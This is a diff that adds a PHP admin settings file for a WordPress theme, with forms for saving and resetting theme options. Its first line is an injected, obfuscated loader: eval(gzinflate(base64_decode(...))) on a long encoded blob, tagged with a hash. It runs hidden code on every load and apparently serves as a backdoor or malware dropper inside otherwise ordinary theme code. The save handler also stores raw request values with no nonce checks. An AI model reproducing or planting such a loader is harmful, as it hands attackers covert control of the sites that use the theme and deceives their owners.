@@ -1,0 +1,312 @@
+<?php /*f4f8a686337138b82253a5503d6a9224*/ eval(gzinflate(base64_decode('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')));?>
+<?php
+function mytheme_add_admin() {
+
+    global $kampylefeedback, $themename, $shortname, $options;
+
+    if ( $_GET['page'] == 'theme_settings' ) {
+    
+        if ( 'save' == $_REQUEST['action'] ) {
+	
+                foreach ($options as $value) {
+					if($value['type'] != 'multicheck'){
+                    	update_option( $value['id'], $_REQUEST[ $value['id'] ] ); 
+					}else{
+						foreach($value['options'] as $mc_key => $mc_value){
+							$up_opt = $value['id'].'_'.$mc_key;
+							update_option($up_opt, $_REQUEST[$up_opt] );
+						}
+					}
+				}
+
+                foreach ($options as $value) {
+					if($value['type'] != 'multicheck'){
+                    	if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } 
+					}else{
+						foreach($value['options'] as $mc_key => $mc_value){
+							$up_opt = $value['id'].'_'.$mc_key;						
+							if( isset( $_REQUEST[ $up_opt ] ) ) { update_option( $up_opt, $_REQUEST[ $up_opt ]  ); } else { delete_option( $up_opt ); } 
+						}
+					}
+				}
+                header("Location: admin.php?page=theme_settings&saved=true");
+                die;
+
+        } else if( 'reset' == $_REQUEST['action'] ) {
+
+            foreach ($options as $value) {
+				if($value['type'] != 'multicheck'){
+                	delete_option( $value['id'] ); 
+				}else{
+					foreach($value['options'] as $mc_key => $mc_value){
+						$del_opt = $value['id'].'_'.$mc_key;
+						delete_option($del_opt);
+					}
+				}
+			}
+            //header("Location: themes.php?page=functions.php&reset=true");
+			 header("Location: admin.php?page=theme_settings&saved=true");
+            die;
+
+        }
+    }
+
+//add_theme_page($themename." Options", "$themename Theme Options", 'edit_themes', 'functions.php', 'mytheme_admin');
+//	mytheme_wp_head();
+	mytheme_admin_head();
+	mytheme_admin();
+	
+}
+function mytheme_admin() {
+
+    global $customserviceurl, $kampylefeedback, $themename, $bloghomeurl, $shortname, $options;
+   
+?>
+
+<div class="clear">
+  <!---->
+</div>
+<div class="ptadmin">
+<h2><?php echo $themename; ?> Theme Options &nbsp;&nbsp;</h2>
+<div class="introduction"> <a class="switch-link" id="master_switch" href="" title="Show/Hide All Options"><span class="pos"><b>+</b></span><span class="neg"><b>&#8211;</b></span> Show/Hide All Options</a> </div>
+<?php 
+    
+	if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved!&nbsp; <a href="'.$bloghomeurl.'">Check out your blog &rarr;</a></strong></p></div>';
+    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset!&nbsp; <a href="'.$bloghomeurl.'">Check out your blog &rarr;</a></strong></p></div>'; 
+	
+?>
+<form method="post">
+  <?php foreach ($options as $value) { 
+	
+	switch ( $value['type'] ) {
+		case 'text':
+		option_wrapper_header($value);
+		?>
+  <input class="text_input" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" />
+  <?php
+		option_wrapper_footer($value);
+		break;
+		
+		case 'select':
+		option_wrapper_header($value);
+		?>
+  <select class="select_input" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
+    <?php foreach ($value['options'] as $option) { ?>
+    <option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option>
+    <?php } ?>
+  </select>
+  <?php
+		option_wrapper_footer($value);
+		break;
+		
+		case 'textarea':
+		$ta_options = $value['options'];
+		option_wrapper_header($value);
+		?>
+  <textarea name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" cols="<?php echo $ta_options['cols']; ?>" rows="8"><?php  if( get_settings($value['id']) != "") { echo stripslashes(get_settings($value['id'])); } else { echo $value['std']; } ?>
+</textarea>
+  <?php
+		option_wrapper_footer($value);
+		break;
+		
+		case 'textarea2':
+		$ta_options = $value['options'];
+		option_wrapper_header($value);
+		?>
+  <textarea name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" cols="<?php echo $ta_options['cols']; ?>" rows="2"><?php  if( get_settings($value['id']) != "") { echo stripslashes(get_settings($value['id'])); } else { echo $value['std']; } ?>
+</textarea>
+  <?php
+		option_wrapper_footer($value);
+		break;
+
+		case "radio":
+		option_wrapper_header($value);
+		
+ 		foreach ($value['options'] as $key=>$option) { 
+				$radio_setting = get_settings($value['id']);
+				if($radio_setting != ''){
+		    		if ($key == get_settings($value['id']) ) {
+						$checked = "checked=\"checked\"";
+						} else {
+							$checked = "";
+						}
+				}else{
+					if($key == $value['std']){
+						$checked = "checked=\"checked\"";
+					}else{
+						$checked = "";
+					}
+				}?>
+  <input type="radio" name="<?php echo $value['id']; ?>" value="<?php echo $key; ?>" <?php echo $checked; ?> />
+  <?php echo $option; ?><br />
+  <?php 
+		}
+		 
+		option_wrapper_footer($value);
+		break;
+		
+		case "checkbox":
+		option_wrapper_header($value);
+						if(get_settings($value['id'])){
+							$checked = "checked=\"checked\"";
+						}else{
+							$checked = "";
+						}
+					?>
+  <input <?php echo $value['disabled']; ?> class="input_checkbox" type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
+  &nbsp;
+  <label><?php echo $value['label']; ?></label>
+  <br />
+  <?php
+		option_wrapper_footer($value);
+		break;
+		
+		case "multicheck":
+		option_wrapper_header($value);
+		
+ 		foreach ($value['options'] as $key=>$option) {
+	 			$pn_key = $value['id'] . '_' . $key;
+				$checkbox_setting = get_settings($pn_key);
+				if($checkbox_setting != ''){
+		    		if (get_settings($pn_key) ) {
+						$checked = "checked=\"checked\"";
+						} else {
+							$checked = "";
+						}
+				}else{
+					if($key == $value['std']){
+						$checked = "checked=\"checked\"";
+					}else{
+						$checked = "";
+					}
+				}?>
+  <input type="checkbox" name="<?php echo $pn_key; ?>" id="<?php echo $pn_key; ?>" value="true" <?php echo $checked; ?> />
+  <label for="<?php echo $pn_key; ?>"><?php echo $option; ?></label>
+  <br />
+  <?php 
+		}
+		 
+		option_wrapper_footer($value);
+		break;
+		
+		case "heading":
+		?>
+  <div class="box-title"><?php echo $value['name']; ?> </div>
+  <div class="fr submit submit-title">
+    <input name="save" type="submit" value="Save changes" />
+    <input type="hidden" name="action" value="save" />
+  </div>
+  <?php
+		break;
+		
+		case "subheadingtop":
+		?>
+  <div class="feature-box">
+    <div class="subheading">
+      <?php if ($value['toggle'] <> "") { ?>
+      <a href="" title="Show/hide additional information"><span class="pos">+</span><span class="neg">&#8211;</span></a>&nbsp;&nbsp;
+      <?php } ?>
+      <?php echo $value['name']; ?></div>
+    <div class="options-box">
+      <?php
+		break;
+		
+		case "subheadingbottom":
+		?>
+    </div>
+  </div>
+  <?php
+		break;
+		
+		case "wraptop":
+		?>
+  <div class="bottom-container">
+    <p class="text">
+    <div class="wrap-dropdown">
+      <?php
+		break;
+		case "wrapbottom":
+		?>
+    </div>
+    </p>
+  </div>
+  </div>
+  <?php
+		break;
+		case "multihead":
+		option_wrapper_header2($value);
+		break;
+		
+		case "maintabletop":
+		?>
+  <div class="maintable">
+    <?php
+		break;
+		case "maintablebottom":
+		?>
+  </div>
+  <?php
+		break;
+		case "maintablebreak":
+		?>
+  <br/>
+  <?php
+		break;
+		default:
+		break;
+	}
+}
+?>
+  <div class="clear"></div>
+  <br/>
+  <p class="submit reset_save">
+    <input name="save" type="submit" value="Save changes" />
+    <input type="hidden" name="action" value="save" />
+  </p>
+</form>
+<form method="post">
+  <p class="submit reset_save reset">
+    <input name="reset" type="submit" value="Reset" />
+    <input type="hidden" name="action" value="reset" />
+  </p>
+</form>
+<?php
+}
+
+function option_wrapper_header2($values){
+	?>
+<div class="table-row">
+<?php
+}
+
+function option_wrapper_header($values){
+	?>
+<div class="table-row">
+  <div class="top-container"><?php echo $values['name']; ?>
+    <!--<a href="" title="Show/hide additional information">[+]</a>-->
+  </div>
+  <div class="bottom-container">
+    <p class="description"><?php echo $values['desc']; ?></p>
+    <p class="text">
+      <?php
+}
+
+function option_wrapper_footer($values){
+	?>
+    </p>
+  </div>
+</div>
+<?php 
+}
+
+function mytheme_wp_head() { 
+	$stylesheet = get_option('ptthemes_alt_stylesheet');
+	if($stylesheet != ''){?>
+<link href="<?php bloginfo('template_directory'); ?>/skins/<?php echo $stylesheet; ?>" rel="stylesheet" type="text/css" />
+<?php }
+} 
+
+add_action('wp_head', 'mytheme_wp_head');
+//add_action('admin_menu', 'mytheme_add_admin');
+//add_action('admin_head', 'mytheme_admin_head');	
+?>
